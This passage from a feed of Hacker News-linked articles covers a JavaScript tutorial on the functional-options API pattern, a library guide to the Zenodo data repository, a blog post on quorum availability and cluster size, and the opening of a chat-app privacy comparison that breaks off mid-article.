<h2 id="passing-an-object-literal">Passing an object literal</h2>
<p>Thinking about the problem differently, we could modify the function signature and use an <code>options</code> object literal to pass our options to the function.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>options</span>) </span>{
   <span>console</span>.log(options.name, options.startDateTime);
}
</code></pre>
<p>This fails horribly because if we pass an object other than what <code>CreateMeet</code> expects or if we’re not passing anything at all. Without proper validation, executing the function will throw an error. </p>
<p>One fix we could do is to define some sensible defaults and merge our <code>options</code> with the default options.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>options</span>) </span>{
  <span>const</span> defaultOptions = {
    <span>name</span>: <span>'No Name'</span>,
    <span>startDateTime</span>: <span>new</span> <span>Date</span>()
  }

  options = {
    ...defaultOptions,
    ...options
  }
}
</code></pre>
<p>Again, without validating <code>options</code> we could merge a totally unrelated object literal with <code>defaultOptions</code>.</p>
<p>Nonetheless, it is a good way of making sure the passed <code>options</code> argument contains all the properties that the function might need and <strong>this solution is enough most of the time</strong>, but it's not the <code>CreateMeet</code> function's job to make sure the options are correct.</p>
<p>Another problem with the solution above is that it's not very reusable in a complex application, where the options are maybe defined in other parts of the code, consider how we would execute this function:</p>
<pre><code>CreateMeet({
  <span>name</span>: <span>'My Meet'</span>,
  <span>startDateTime</span>: <span>new</span> <span>Date</span>(<span>2021</span>,<span>0</span>,<span>6</span>,<span>13</span>,<span>15</span>,<span>0</span>,<span>0</span>)
})
</code></pre>
<p>This type of configuration initialization falls short if we have many configuration options that our function does not necessarily care about, and if we want to validate for correct values too; or if we want to define required options.</p>
<h2 id="passing-in-variables-and-object-literals">Passing in variables and object literals</h2>
<p>One could argue we could write something like this where the <code>name</code> is explicitly defined...</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>name, options</span>) </span>{
  ...
}
</code></pre>
<p>...but then we circled back to our original problem where every function argument was explicitly defined making it inflexible for future modifications.</p>
<h2 id="passing-in-variadic-variables">Passing in variadic variables</h2>
<p>An alternative solution we could implement is using variadic function arguments.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
  <span>console</span>.log(options)
}
</code></pre>
<p>With this approach, <code>...options</code> becomes an array of JavaScript primitive types, but we would still need to validate each individual option item in the array to make sure the correct option is passed to our function.</p>
<h2 id="passing-in-variadic-functions">Passing in variadic functions</h2>
<p><strong>Variadic function arguments to the rescue!</strong> In this solution we could just pass in functions for <code>...options</code> and to make sure that we only accept functions as arguments.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    ...
  })
}
</code></pre>
<p>In the function above if the <code>...options</code> item is not of type function it will continue to iterate to the next item. </p>
<p>Okay, but what's the purpose of this? Well, we could pass in our specific options literal to the option functions that are passed as arguments which in turn validate and modify our options literal, and removing this concern from our <code>CreateMeet</code> function.</p>
<p>Consider the following option function that would be passed to <code>CreateMeet</code>.</p>
<pre><code><span><span>function</span> <span>Name</span>(<span>value</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.name = value
  }
}
</code></pre>
<p>So what's happening here? The <code>Name</code> is an "option function" which, in turn, returns a function accepting our options literal from <code>CreateMeet</code>. Let's modify <code>CreateMeet</code> to understand it more clearly.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
  <span>let</span> config = {
    <span>name</span>: <span>''</span>,
    <span>startDateTime</span>: <span>null</span>
  }

  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    opt(config)   
  })
</code></pre>
<p>Executing <code>CreateMeet</code> would look like this.</p>
<pre><code>CreateMeet(
  Name(<span>'My Meet'</span>)
)
</code></pre>
<p>Passing in <code>Name</code> as an argument, which, remember, returns a function, and this returned function from <code>Name</code> would be executed in <code>CreateMeet</code> with <code>opt(config)</code> where <code>config</code> is our configuration object literal that we actually care about.</p>
<p>Let's define a <code>startDateTime</code> function option to better understand this method.</p>
<pre><code><span><span>function</span> <span>StartDateTime</span>(<span>year, month, date, hour, minute</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    
    
    
    month = (month - <span>1</span> &lt;= <span>0</span>) ? <span>0</span> : month - <span>1</span>
    options.startDateTime = <span>new</span> <span>Date</span>(year, month, date, hour, minute, <span>0</span>, <span>0</span>)
  }
}
</code></pre>
<p>Passing in these function arguments to <code>CreateMeet</code> would look like this.</p>
<pre><code>CreateMeet(
  Name(<span>'My Meet'</span>),
  StartDateTime(<span>2021</span>, <span>1</span>, <span>6</span>, <span>13</span>, <span>15</span>)
)
</code></pre>
<p>This makes our function much more readable to other developers, we instantly know that <code>CreateMeet</code> is executed by defining a <code>Name</code> and <code>StartDateTime</code>.</p>
<p>Furthermore, we could extract the initialization of the options altogether from <code>CreateMeet</code> into a separate function such as this, which not necessarily need to be exported.</p>
<pre><code><span><span>function</span> <span>setupConfig</span>(<span>...options</span>) </span>{
  <span>let</span> config = {
    <span>name</span>: <span>''</span>,
    <span>startDateTime</span>: <span>null</span>
  }

  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    opt(config)   
  })

  <span>return</span> config
}
</code></pre>
<p>Now, <code>CreateMeet</code> would only execute code that it cares about.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
    <span>const</span> config = setupConfig(...options)

    
    <span>console</span>.log(config)
}
</code></pre>
<h2 id="extending-createmeet">Extending CreateMeet</h2>
<p>Extending our <code>CreateMeet</code> function becomes trivial with this approach.</p>
<p>Let's say we want to add another option to our function, but still want to ensure backward compatibility. We want to add the option of allowing only specific users, from a list, in the meet, thus executing <code>CreateMeet</code> will handle this scenario correctly.</p>
<p>Our <code>AllowedUsers</code> function option could look like this.</p>
<pre><code><span><span>function</span> <span>AllowedUsers</span>(<span>userList</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers = userList
  }
}
</code></pre>
<p>Passing in this new option function is as easy as adding a new argument to <code>CreateMeet</code></p>
<pre><code>CreateMeet(
  Name(‘My Meet’),
  StartDateTime(<span>2021</span>,<span>1</span>,<span>6</span>,<span>13</span>,<span>15</span>),
  AllowedUsers([‘john’, ‘jane’])
)
</code></pre>
<p>Keep in mind that the public API of our function hasn't changed, the previous examples work the same way with or without <code>AllowedUsers</code> being passed to <code>CreateMeet</code>.</p>
<p>We can go as far as to add different methods to manipulate the same option, in this example, <code>AllowedUsers</code> only accepts a user list and then overwrites the configuration with that list.</p>
<p>Let's say, down the road, in a future version of our application, we'll want to add a function that accepts a single user name only. In this case, we could write a new function like this.</p>
<pre><code><span><span>function</span> <span>AllowedUser</span>(<span>userName</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers.push(userName)
  }
}
</code></pre>
<p>Executing <code>CreateMeet</code> works as expected, end users can use either <code>AllowedUsers</code> <em>(plural)</em> to pass in a user list or <code>AllowedUser</code> <em>(singular)</em> to append a user name to an existing list.</p>
<h2 id="conclusion">Conclusion</h2>
<p>We, as developers, should be very aware of how the public-facing API of our code is being consumed by other users.</p>
<p>This technique helps to keep this API flexible enough for future modifications and it's just another technique in the arsenal of a developer.</p>
<p>Should you use it every time? Probably not, in most cases passing a configuration object literal is enough, but if you have complex configuration setups, want greater flexibility, and also extracting the configuration setup from functions that don't care about it, then this approach is a good fit.</p>
<p><strong>I hope you enjoyed this article, please comment and consider sharing it.</strong></p>
<p>If you have any questions you can contact me here in the comments or on <a target="_blank" href="https://twitter.com/feketegy">Twitter</a>.</p>
<p>Below you'll find the full example presented in this article as well as a Codepen demo.</p>
<hr>
<h3 id="full-example">Full Example</h3>
<pre><code><span><span>function</span> <span>Name</span>(<span>value</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.name = value
  }
}

<span><span>function</span> <span>StartDateTime</span>(<span>year, month, date, hour, minute</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    month = (month - <span>1</span> &lt;= <span>0</span>) ? <span>0</span> : month - <span>1</span>
    options.startDateTime = <span>new</span> <span>Date</span>(year, month, date, hour, minute, <span>0</span>, <span>0</span>)
  }
}

<span><span>function</span> <span>AllowedUsers</span>(<span>userList</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers = userList
  }
}

<span><span>function</span> <span>AllowedUser</span>(<span>userName</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers.push(userName)
  }
}

<span><span>function</span> <span>setupConfig</span>(<span>...options</span>) </span>{
  <span>let</span> config = {
    <span>name</span>: <span>''</span>,
    <span>startDateTime</span>: <span>null</span>,
    <span>allowedUsers</span>: []
  }

  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    opt(config)   
  })

  <span>return</span> config
}

<span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
    <span>const</span> config = setupConfig(...options)

    
    <span>console</span>.log(config)
}

CreateMeet(
  Name(<span>'My Meet'</span>),
  StartDateTime(<span>2021</span>, <span>1</span>, <span>6</span>, <span>13</span>, <span>15</span>)
)

CreateMeet(
  Name(<span>'Private Meet'</span>),
  StartDateTime(<span>2020</span>, <span>1</span>, <span>6</span>, <span>14</span>, <span>0</span>),
  AllowedUsers([<span>'john'</span>, <span>'jane'</span>])
)

CreateMeet(
  Name(<span>'One-on-one Meet'</span>),
  StartDateTime(<span>2021</span>, <span>1</span>, <span>6</span>, <span>14</span>, <span>30</span>),
  AllowedUser(<span>'kevin'</span>)
)
</code></pre>
<h3 id="codepen-example">Codepen Example</h3>

</div></div>]]>
            </description>
            <link>https://primalskill.blog/how-to-create-flexible-javascript-apis-with-functional-options</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683224</guid>
            <pubDate>Fri, 08 Jan 2021 10:10:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zenodo open data repository (CERN)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683140">thread link</a>) | @amai
<br/>
January 8, 2021 | https://www.eui.eu/Research/Library/ResearchGuides/Economics/Statistics/DataPortal/Zenodo | <a href="https://web.archive.org/web/*/https://www.eui.eu/Research/Library/ResearchGuides/Economics/Statistics/DataPortal/Zenodo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mainContent">
<div>
<div>
<ul>
<li></li>
<li><a href="#Datadescription">Resource description</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li>
<li><a href="#Timeperiod">Time period</a></li>
<li><a href="#Supportlinks">Support&nbsp;links</a></li>
<li><a href="#Howtoaccessdata">How to access data</a></li>
</ul>

<hr>
<h5><a id="Datadescription"><strong>Resource description</strong></a></h5>
<p><a href="https://www.zenodo.org/"><img alt="Zenodo" height="84" width="150" src="https://www.eui.eu/Images/Images-2011/Research/Library/ResearchGuides/Economics/DataLogos/Zenodo150x84.jpg">Zenodo</a>&nbsp;is a multi-disciplinary open repository maintained by <a href="https://home.cern/fr">CERN.</a>&nbsp;Datasets, documents and other research materials can be located via the&nbsp;<a href="https://www.zenodo.org/">Zenodo&nbsp;search&nbsp;engine.</a></p>
<p>Scholars from any research discipline can upload data in any file format. A&nbsp;digital object identifier (DOI) is automatically assigned to all Zenodo files. Details on how to assign metadata&nbsp;to research datasets are in section 5(c) of the EUI Library <a title="EUI Library Research Data Guide" href="https://www.eui.eu/Research/Library/ResearchDataServices/Guide">Research Data Guide. </a>For assistance, write to <a href="https://www.eui.eu/cdn-cgi/l/email-protection#74061107101500153411011d5a1101"><span data-cfemail="1163746275706570517464783f7464">[email&nbsp;protected]</span></a></p>
<p>In April 2020, Zenodo launched a&nbsp;<a href="https://zenodo.org/communities/covid-19/search?page=1&amp;size=20">Coronavirus Research Community - COVID-19</a>&nbsp;accepting data from all scientific disciplines and sub-disciplines.</p>
<p>Zenodo is compliant with the data management requirements of&nbsp;<a href="https://ec.europa.eu/programmes/horizon2020/en/what-horizon-2020">Horizon 2020</a>&nbsp;and <a href="https://ec.europa.eu/info/horizon-europe-next-research-and-innovation-framework-programme_en">Horizon Europe,</a>&nbsp;the&nbsp;EU's research and innovation funding programmes. "The <a href="https://www.openaire.eu/">OpenAIRE</a> project, in the vanguard of the open access and open data movements in Europe, was commissioned by the EC to support their nascent Open Data policy by providing a catch-all repository for EC funded research. <a href="https://home.cern/fr">CERN</a>&nbsp;an OpenAIRE partner and pioneer in open source, open access and open data, provides this capability."</p>

<hr>
<h5><a id="Timeperiod"><strong>Time period </strong></a></h5>
<ul>
<li>Data coverage is indicated in file-level metadata, varying by dataset</li>
<li>Zenodo&nbsp;was launched&nbsp;in 2013.</li>
</ul>

<hr>
<h5><a id="Supportlinks"><strong>Support links</strong></a></h5>
<ul>
<li>Zenodo features are introduced in <a href="https://www.zenodo.org/features">this quick reference guide</a></li>
<li>Data access and reposit services are explained on <a href="https://www.zenodo.org/about">this Zenodo page</a></li>
<li>Policies on access, use, reposit and licensing are explained in <a href="https://www.zenodo.org/policies">this Zenodo directory.</a></li>
</ul>

<hr>
<h5><a id="Howtoaccessdata"><strong>How to access data </strong></a></h5>
<ul>
<li>Locate datasets via&nbsp;<a href="https://www.zenodo.org/">Zenodo ElasticSearch</a></li>
<li>Browse datasets&nbsp;via the <a href="https://www.zenodo.org/communities/">Zenodo communities directory.</a></li>
</ul>

<hr>
<p><a title="Research Data Services" href="https://www.eui.eu/Research/Library/ResearchDataServices">Data homepage</a></p>

</div>

</div>
</div><div id="pageBottom">
<div id="pagetools">
<p>Page last updated on 27 October 2020</p>
</div>


</div></div>]]>
            </description>
            <link>https://www.eui.eu/Research/Library/ResearchGuides/Economics/Statistics/DataPortal/Zenodo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683140</guid>
            <pubDate>Fri, 08 Jan 2021 09:49:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quorum Availability]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683117">thread link</a>) | @fanf2
<br/>
January 8, 2021 | http://brooker.co.za/blog/2021/01/06/quorum-availability.html | <a href="https://web.archive.org/web/*/http://brooker.co.za/blog/2021/01/06/quorum-availability.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">


<p>It's counterintuitive, but is it right?</p>


<p>In our paper <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a>, we say this about the availability of quorum systems of various sizes:</p>

<blockquote><p>As illustrated in Figure 4, smaller cells offer lower availability in the face of small numbers of uncorrelated node failures, but better availability when the proportion of node failure exceeds 50%. While such high failure rates are rare, they do happen in practice, and a key design concern for Physalia.</p></blockquote>

<p>And this is what Figure 4 looks like:</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/mtb_fig_4.png" alt=""></p>

<p>The context here is that a <em>cell</em> is a Paxos cluster, and the system needs a majority quorum for the cluster to be able to process requests<sup><a href="#foot1">1</a></sup>. A cluster of one box needs one box available, five boxes need three available and so on. The surprising thing here is the claim that having smaller clusters is actually <em>better</em> if the probability of any given machine failing is very high. The paper doesn't explain it well, and I've gotten a few questions about it. This post attempts to do better.</p>

<p>Let's start by thinking about what happens for a cluster of one machine (<em>n=1</em>), in a datacenter of <em>N</em> machines (for very large <em>N</em>). We then fail each machine independently with probability <em>p</em>. What is the probability that our one machine failed? That's trivial: it's <em>p</em>. Now, let's take all <em>N</em> machines and put them into a cluster of <em>n=N</em>. What's the probability that a majority of the cluster is available? For large <em>N</em>, it's 1 for <em>p &lt; 0.5</em>, and 0 for <em>p &gt; 0.5</em>. If less than half the machines fail, less than half have failed. If more than half the machines fail, more than half have failed. Ok?</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/quorum_avail_a.png" alt=""></p>

<p>Notice how a cluster size of 1 is worse than N up until <em>p = 0.5</em> then better after. <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.38.5629&amp;rep=rep1&amp;type=pdf">Peleg and Wool</a> say:</p>

<blockquote><p>... for <em>0 &lt; p &lt; ½</em> the most available NDC<sup><a href="#foot2">2</a></sup> is shown to be the "democracy" (namely, the minimal majority system), while the "monarchy" (singleton system) is least available. Due to symmetry, the picture reverses for <em>½ &lt; p &lt; 1</em>.</p></blockquote>

<p>Here, the <em>minimal majority system</em> is the one I'd call a <em>majority quorum</em>, and is used by Physalia (and, indeed, most Paxos implementations). The <em>monarchy</em> is where you have one leader node.</p>

<p>What about real practical cluster sizes like <em>n=3</em>, 5, and 7? There are three ways we can do this math. In <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.38.5629&amp;rep=rep1&amp;type=pdf">The Availability of Quorum Systems</a>, Peleg and Wool derive closed-form solutions to this problem<sup><a href="#foot3">3</a></sup>. Our second approach is to observe that the failures of the nodes are Bernoulli trials with probability <em>p</em>, and therefore we can read the answer to "what is the probability that 0 or 1 of 3 fail for probability <em>p</em>" from the distribution function of the <a href="https://en.wikipedia.org/wiki/Binomial_distribution">binomial distribution</a>. Finally, we can be lazy and do it with Monte Carlo. That's normally my favorite method, because it's easier to include correlation and various "what if?" questions as we go.</p>

<p>Whichever way you calculate it, what do you expect it to look like? For small <em>n</em> you may expect it to be closer in shape to <em>n=1</em>, and for large <em>n</em> you may expect it to approach the shape of <em>n=N</em>. If that's what you expect, you'd be right.</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/quorum_avail_b.png" alt=""></p>

<p>I'll admit that I find this result deeply deeply counter-intuitive. I think it's right, because I've approached it multiple ways, but it still kind of bends my mind a little. That may just be me. I've discussed it with friends and colleagues over the years, and they seem to think it matches their intuition. It's counter-intuitive to me because it suggests that smaller <em>n</em> (smaller clusters, or smaller cells in Physalia's parlance) is better for high <em>p</em>! If you think a lot of your boxes are going to fail, you may get better availability (not durability, though) from smaller clusters.</p>

<p>Weird.</p>

<p><strong>Correlation to the rescue!</strong></p>

<p>It's not often that my statistical intuition is saved by introducing correlation, but in this case it helps. I'd argue that, in practice, that you only lose machines in an uncorrelated Bernoulli trial way for small <em>p</em>. Above a certain <em>p</em>, it's likely that the failures have some shared cause (power, network, clumsy people, etc) and so the failures are likely to be correlated in some way. In which case, we're back into the game we're playing with Physalia of avoiding those correlated failures by optimizing placement.</p>

<p>In many other kinds of systems, like ones you deploy across multiple datacenters (we'd call that <em>regional</em> in AWS, deployed across multiple <em>availability zones</em>), you end up treating the datacenters as units of failure. In that case, for 3 datacenters you'd pick something like <em>n=9</em> because you can keep quorum after the failure of an entire datacenter (3 machines) and any one other machine. As soon as there's correlation, the math above is mostly useless and the correlation's cause is all that really matters.</p>

<p>Availability also isn't the only thing to think about with cluster size for quorum systems. Durability, latency, cost, operations, and contention on leader election also come into play. Those are topics for another post (or section 2.2 of <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a>).</p>

<p><strong>Updates</strong></p>

<p>JP Longmore sent me this intuitive explanation, which makes a lot of sense:</p>

<blockquote><p>Probability of achieving a quorum will increase when removing 2 nodes from a cluster, each with failure rate p&gt;.5, since on average you're removing 2 bad nodes instead of 2 good nodes. Other cases with 1 good node &amp; 1 bad node don't change the outcome (quorum/not). Repeat reasoning till N=1 or all remaining nodes have p&lt;=.5 (if failure rate isn’t uniform).</p></blockquote>

<p><strong>Footnotes</strong></p>

<ol>
<li><a name="foot1"></a> Physalia uses a very naive Paxos implementation, intentionally optimized for testability and simplicity. The quorum intersection requirements of Paxos (or Paxos-like protocols) are more subtle than this, and work like Heidi Howard et al's <a href="https://fpaxos.github.io/">Flexible Paxos</a> has been pushing the envelope here recently. <a href="https://arxiv.org/pdf/1608.06696v1.pdf">Flexible Paxos:  Quorum intersection revisited</a> is a good place to start.</li>
<li><a name="foot2"></a> Here, an NDC is a <em>non-dominated coterie</em>, and a <em>coterie</em> is a set of groups of nodes (like <em>{{a, b}, {b, c}, {a, c}}</em>). See Definition 2.2 in <a href="https://www.cs.purdue.edu/homes/bb/cs542-20Spr/readings/reliability/How%20to%20assign%20Votes-JACM-garcia-molina.pdf">How to Assign Votes in a Distributed System</a> for the technical definition of domination. What's important, though, is that for each <em>dominated coterie</em> there's a <em>non-dominated coterie</em> that provides the same mutual exclusion properties, but superior availability under partitions. The details are not particularly important here, but are very interesting if you want to do tricky things with quorum intersection.</li>
<li><a name="foot3"></a> Along with a whole lot of other interesting facts about quorums, majority quorums and other things. It's a very interesting paper. Another good read in this space is Garcia-Molina and Barbara's <a href="https://www.cs.purdue.edu/homes/bb/cs542-20Spr/readings/reliability/How%20to%20assign%20Votes-JACM-garcia-molina.pdf">How to Assign Votes in a Distributed System</a>, which both does a better job than Peleg and Wool of defining the terms it uses, but also explores the general idea of assigning <em>votes</em> to machines, rather than simply forming quorums of machines. As you read it, it's worth remembering that it predates Paxos, and many of the terms might not mean what you expect.</li>
</ol>


</div></div>]]>
            </description>
            <link>http://brooker.co.za/blog/2021/01/06/quorum-availability.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683117</guid>
            <pubDate>Fri, 08 Jan 2021 09:43:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Signal, thank you for not collecting my data. But I won’t use you]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25682981">thread link</a>) | @rukshn
<br/>
January 8, 2021 | https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Facebook has given an ultimatum for WhatsApp users to either share their data with Facebook or leave the service. And that date is February 8th.</p>
<p>One of the most appealing things about WhatsApp is it’s end to end encryption. Even though their are other chat apps, no one provides end to end encryption to chats by default other than WhatsApp and Signal. </p>
<p>Not even Telegram provide encryption by default, and you need to start a secret chat to enable end to end encryption.</p>
<p>One of the most important things in iOS 14 is the ability for users see what kind of data apps are collecting from their users. </p>

<p>So in light of all this I went through the top 10 social networking/chat apps to see how much data they are collecting in comparison to Signal, and explain why I won’t use Signal and what we can do instead.</p>
<h2>The top 10 social media/chat apps</h2>

<figure><img data-attachment-id="146" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/img_1621/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=828%2C1792&amp;ssl=1" data-orig-size="828,1792" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_1621" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=139%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=473%2C1024&amp;ssl=1" loading="lazy" width="473" height="1024" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=139%2C300&amp;ssl=1 139w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=768%2C1662&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=710%2C1536&amp;ssl=1 710w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?w=828&amp;ssl=1 828w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=139%2C300&amp;ssl=1 139w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=768%2C1662&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=710%2C1536&amp;ssl=1 710w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?w=828&amp;ssl=1 828w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Telegram</h2>
<p>Telegram is one of the better apps when we compare with the others in this group. They collect relatively small amount of data.</p>
<p>It is currently the number 1 in my region, Telegram is extremely popular in my region because it provides a great way to share pirated content. </p>
<p>There is no limit to the file size that you can upload on Telegram, and there is no limit for the number of users that a Telegram group can have.</p>
<p>This makes it an ideal place for people to share pirated copies of movies, games, songs in groups with hundreds of users.</p>
<figure><img data-attachment-id="157" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=473%2C598&amp;ssl=1" data-orig-size="473,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=237%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=473%2C598&amp;ssl=1" loading="lazy" width="473" height="598" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=473%2C598&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=237%2C300&amp;ssl=1 237w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=237%2C300&amp;ssl=1 237w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=473%2C598&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<p>I’m bit reluctant to use Telegram due to its poor user interface, and its connections to Russia.</p>
<p>To clarify what I meant by poor user interface, on the android device that I tried Telegram, I was unable to select multiple chats, and deleting a chat is a multi step process. It doesn’t have to be that complicated.</p>
<h2><strong>WhatsApp</strong> </h2>
<p>WhatsApp is currently the number 2 in my region, and when compared with Telegram, WhatsApp is collecting a decent amount of data to track you.</p>
<figure><img data-attachment-id="158" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-1/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=473%2C701&amp;ssl=1" data-orig-size="473,701" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=202%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=473%2C701&amp;ssl=1" loading="lazy" width="473" height="701" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=473%2C701&amp;ssl=1" alt="" 